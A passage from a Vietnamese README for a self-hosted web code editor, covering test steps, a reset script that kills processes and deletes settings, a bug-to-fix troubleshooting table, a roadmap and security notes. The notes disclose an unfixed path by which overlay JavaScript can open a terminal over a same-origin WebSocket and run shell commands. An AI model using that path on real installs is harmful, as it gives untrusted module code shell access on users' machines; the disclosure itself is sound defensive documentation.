# 3. Xóa module
rm -rf modules/test_new
# Đợi ≤ 2s → console in "[Watcher] ⚡ module removed: test_new"
```

17.5. Test terminal cleanup (v2.0.1 — C4)

```
1. Mở terminal
2. Gõ `exit` (hoặc Ctrl-D)
3. Terminal hiện "[process exited with code 0]"
4. Mở lại terminal → OK (không bị "Terminal limit reached")
5. Lặp lại 10 lần → vẫn OK
```

17.6. Reset khi kẹt

```bash
pkill -f "python main.py"
fuser -k 8765/tcp
rm core/data/.run_pids.json
rm core/data/settings.json
rm -rf modules/*/storage/.tmp_uploads
python3 main.py
```

---

18. Troubleshooting

Vấn đề Nguyên nhân Cách khắc phục
Undo/redo không hoạt động Focus trong input/modal Click vào editor rồi thử lại
Ctrl+S trong Settings save nhầm editor (Đã fix L16) Update v2.0.1
Dirty ● mất khi gõ nhanh Lazy load mode reset content Đã fix C7
Diagnostics markers mất Lazy load mode swap doc Đã fix C8
Diagnostics stale ở nested path Split / sai Đã fix C9
Theme không đổi Theme CM5 không hợp lệ Đổi sang dracula / default / material / monokai / solarized / eclipse
Overlay CSS không load File sai chỗ data/ hoặc web/ Xem §5.5
Overlay CSS phá core Thiếu namespace prefix Loader warn — xem §5.5
Overlay JS chạy 2 lần Module không dùng ACDV.register Migration §6.3
Overlay JS leak listener Module cũ dùng addEventListener Migration §6.3 — dùng ctx.on
Tắt JS mất CSS Unload full Đã fix C6
Safe mode không tắt được Module cũ không cleanup v2.0.1 cleanup module dùng ACDV.register
Uninstall ghost Overlay chạy sau xóa Đã fix từ v2.0.0
"Terminal limit reached" Session leak khi process exit Đã fix C4
Terminal "Connecting…" mãi WS queue đầy Đã fix M14 — retry 2 s
Terminal chết sau 5 phút WS timeout 300 s Đã fix H4 — heartbeat 90 s
Đóng tab editor file đã xóa → save resurrect Không đóng tab khi delete Đã fix C10 + M7
Save sau delete project → tái sinh write_file tạo dir Đã fix C10
Module output trộn panel Run Không filter project Đã fix C11
Module không auto-detect Watcher chết từ đầu Đã fix C1
Sửa module không reload Watcher không check mtime Đã fix C2
Critical module fail → server vẫn chạy Không exit Đã fix C3
Settings corrupt sau crash Write không atomic Đã fix H5
Upload chunk fail Assemble phụ thuộc thứ tự Đã fix H6
Concurrent upload mất metadata Không lock Đã fix H7
Storage vượt quota Chỉ check chunk đầu Đã fix H8
Upload báo lỗi dù file đã lưu check_and_warn raise Đã fix H9
Stale diagnostics sau reload Cache không clear Đã fix H10
Install bỏ qua on_shutdown cũ Folder đã xóa tay Đã fix H11
Overlay double-init Race register trước ready Đã fix H12
CSP vẫn cho WS ngoài Wildcard ws: Đã fix C5 — siết host:port
2 tab tranh chấp config Không broadcast Đã fix M9
2 tab tranh chấp settings Không reload UI Đã fix M12
Upload trùng tên không cảnh báo Ghi đè silent Đã fix M5
App init fail → trang blank Không catch Đã fix M6
Serve /.env Không check dotfile Đã fix L1
Download lớn không resume Không có Range Đã fix L2
Log file collision Dùng _ thay / Đã fix L8
Disk đầy vì log cũ Không cleanup Đã fix L10
Module treo thread diagnostics Không timeout Đã fix L15 — 5 s
Đọc README sai tên Hard-code wecom.md Đã fix H2 — fallback README.md
Port sai (8889 vs 8765) Mismatch Đã fix H1 — đồng bộ 8765
Process treo khi disconnect auto_stop_on_disconnect Đặt true trong config.json
Terminal không mở được CDN chặn xterm.js Check console [Terminal] xterm.js not loaded
Export nút ⬇ không hiện Cache frontend Hard reload Ctrl+Shift+R
Import báo "already installed" Module cùng tên Uninstall/delete trước
Storage upload "QuotaExceeded" ≥ 98 % quota Xóa file cũ / clear all
Không thấy syntax highlight CDN chặn mode script Check Network — verify mode script load
Bấm ▶ .java báo "Core không hỗ trợ" Đúng thiết kế Cài module lang_java
Module compile báo "javac not found" Chưa pkg install "Install JDK" trong Modules, hoặc Terminal pkg install openjdk-17

---

19. Known Issues / Roadmap

19.1. Cần test kỹ (v2.0.1)

· ☐ Error dispatch chain: on_any_error → on_http_error với 3+ module.
· ☐ Settings modal: schema validation, on_settings_changed callback.
· ☐ Diagnostics: auto-run on save, inline markers, jump-to-line.
· ☐ Core route protection: module cố override /api/status phải bị reject.
· ☐ Android: Samsung Internet, Firefox mobile.
· ☐ Terminal: Windows pipes (không có PTY), copy/paste mobile.
· ☐ Undo/Redo: selection state sau swapDoc, fold state per-tab, IME composition.
· ☐ Export: symlink handling, project lớn (> 100 MB), concurrent export.
· ☐ Storage: quota edge case (upload vượt 100 %, concurrent upload).
· ☐ Overlay v2.0.1: migration test với 3+ module cũ.
· ☐ Overlay v2.0.1: CSP tương thích Safari cũ.
· ☐ WS queue: overflow behavior khi mất mạng lâu.
· ☐ Heartbeat v2.0.1: không conflict khi proxy block WS.

19.2. Nice to have

· ☐ Import from Git URL.
· ☐ Multi-user auth.
· ☐ Resource limits (CPU/mem per process).
· ☐ Overlay: iframe sandbox (fix triệt để RCE) — ưu tiên cao.
· ☐ Overlay: capability registry (chống trùng chức năng).
· ☐ Overlay: hot-reload khi save file trong data/.
· ☐ Per-file undo history persistence (sessionStorage).
· ☐ Per-file fold state persistence (localStorage).
· ☐ Terminal scrollback persistence.
· ☐ Terminal split panes.
· ☐ Export: chọn subset file (checkbox tree).
· ☐ Storage: file preview (image, text).
· ☐ Storage: quota dashboard toàn hệ thống.
· ☐ Multi-language: LSP integration (hover, goto-def, autocomplete).
· ☐ Multi-language: Tree-sitter thay CodeMirror modes.

19.3. Roadmap

v2.0.x — polish (hiện tại v2.0.1)

· ✅ Fix 35 lỗi critical/high/medium/low.
· ✅ Watcher hoạt động đúng (add/reload/remove).
· ✅ Terminal leak fixed.
· ✅ CSP siết WS.
· ✅ Overlay CSS preserved khi tắt JS.
· ☐ Test suite cho 3+ module overlay cũ (migration).
· ☐ CapabilityRegistry generic (autocomplete, format, hover, goto_def).
· ☐ Diagnostics dedup giữa nhiều module.
· ☐ Router reject collision (owner tracking) — đã có _unregister_module_routes.

v2.1.0 — overlay sandbox

· ☐ Overlay JS chạy trong <iframe sandbox>.
· ☐ Giao tiếp qua postMessage với whitelist API.
· ☐ Terminal open từ overlay cần confirmation.
· ☐ Capability contract cho autocomplete/diagnostics.
· ☐ Fix triệt để RCE qua terminal_open (CSP không chặn được WS same-origin).

v2.2.0 — module marketplace

· ☐ UI chọn module theo ngôn ngữ (thay vì upload ZIP).
· ☐ Module registry (JSON index) để list module có sẵn.
· ☐ Terminal: multiple tabs.
· ☐ Undo history persistence qua sessionStorage.

v3.0.0 — scale

· ☐ Multi-user + auth.
· ☐ Collaborative editing (WS) — OT.
· ☐ Docker isolation per project.
· ☐ LSP server bridge (module tự spawn gopls, rust-analyzer, …).
· ☐ Module compile sandbox (chroot).

---

20. Legal

Educational / personal use. Không cài module từ nguồn không tin cậy — module có toàn quyền Python. Không chạy server bằng sudo. Terminal chạy với quyền người dùng server — cẩn trọng khi expose ra mạng LAN/WAN.

Module Storage không có authentication — chỉ serve file người dùng upload. Không lưu dữ liệu nhạy cảm.

⭐ Module compile: Module compile có quyền chạy pkg install và spawn process với quyền người dùng — nguy hiểm tương đương việc bạn tự chạy lệnh đó. Chỉ cài module từ nguồn tin cậy.

⭐ Overlay v2.0.1: Overlay JS chạy trong browser của app. v2.0.1 có:

· Cleanup registry — reload/uninstall tự dọn.
· CSP connect-src siết theo host:port — chặn overlay gọi mạng ngoài qua HTTP lẫn WS (fix C5).
· ETag cache — không bust, không leak khi reload.
· Tắt JS không xóa CSS (fix C6).

Chưa fix triệt để (roadmap v2.1):

· Overlay vẫn có thể gửi terminal_open qua WS same-origin → chạy lệnh shell với quyền người dùng. CSP connect-src không chặn được vì WS là same-origin.
· Fix triệt để cần iframe sandbox — overlay không truy cập được window.App / window.fetch, chỉ giao tiếp qua postMessage whitelist.
· Trong khi chờ, chỉ cài module tin cậy.

⭐ Multi-language editing: Core chỉ syntax highlight + lưu plaintext — không chạy/không compile ngôn ngữ ngoài .py / .js / .sh / .bash. File được lưu nguyên văn UTF-8.

---

Phụ lục — Tóm tắt thay đổi README v2.0.1

Mục Nội dung mới
§0 (mới) "Thay đổi so với v2.0.0" — chi tiết 35 lỗi + nguyên nhân + file + đối tượng ảnh hưởng
Header Version 2.0.1, port 8765
§1 Status Thêm cột "v2.0.1 fix" cho từng layer
§3 Cấu trúc Thêm wecom.md + README.md song song
§4 Architecture Thêm ghi chú v2.0.1 cho từng component
§5 Contract Ghi chú C3 (critical fail-fast), M11 (missing overlay warning)
§6 Overlay Bảng cơ chế v2.0.1, C5 siết CSP, C6 tách JS/CSS, H12 record identity
§7 Multi-language Không đổi lớn, thêm ghi chú C7
§8 Storage Thêm note H6, H7, H8, H9
§9 API /api/readme fallback 3 tên (H2)
§10 WS Thêm project_deleted, project_file_deleted, config_changed (M7, M8, M9)
§11 Editor Hot apply có M12 (reload SettingsUI)
§12 Undo/Redo Thêm C7 (dirty flag preserved)
§13 Terminal Thêm C4, H4, M14
§17 Testing +6 test mới (watcher, terminal cleanup, tắt JS không mất CSS, …)
§18 Troubleshooting 40+ dòng mới mapping bug → fix → version
§19 Roadmap v2.0.x có checklist fix, v2.1 iframe sandbox là ưu tiên
§20 Legal Nhấn mạnh CSP chỉ chặn HTTP exfil, KHÔNG chặn WS same-origin

Triết lý cốt lõi:

· ✅ Edit: core hỗ trợ ~50 ngôn ngữ qua CodeMirror — chỉ syntax highlight + save UTF-8.
· ✅ Run core: CHỈ .py, .js, .sh, .bash.
· ✅ Run khác: bắt buộc qua module — module tự pkg install + spawn compiler + stream output.
· ✅ Overlay v2.0.1: ACDV.register() + cleanup registry — nhiều module không conflict.
· ✅ CSP connect-src siết: chặn overlay exfil qua HTTP lẫn WS ngoài host hiện tại (WS same-origin vẫn cần iframe sandbox).